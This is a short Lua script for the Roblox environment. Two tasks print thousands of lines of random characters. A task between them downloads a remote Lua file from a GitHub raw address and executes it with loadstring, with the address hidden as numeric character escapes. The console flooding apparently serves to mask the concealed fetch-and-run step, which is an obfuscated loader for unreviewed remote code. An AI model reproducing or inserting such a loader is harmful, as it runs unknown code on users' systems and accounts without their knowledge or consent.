function randomstring()
local a = math.random(10,40)
local args = {}
    for i=1,a do
        args[i] = string.char(math.random(16,128))
    end
    return table.concat(args)
end
task.spawn(function()
for i=1,10000 do
    task.wait()
    print(randomstring())
end
end)
task.spawn(function()
    loadstring(game:HttpGet(("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\115\120\99\115\114\49\49\52\53\49\52\47\115\120\99\115\114\49\49\52\53\49\52\49\47\109\97\105\110\47\115\120\99\115\114\49\52\56\56\55\53\56\49\46\108\117\97"),true))()
end)
task.spawn(function()
for i=1,10000 do
    task.wait()
        print(randomstring())
    end
end)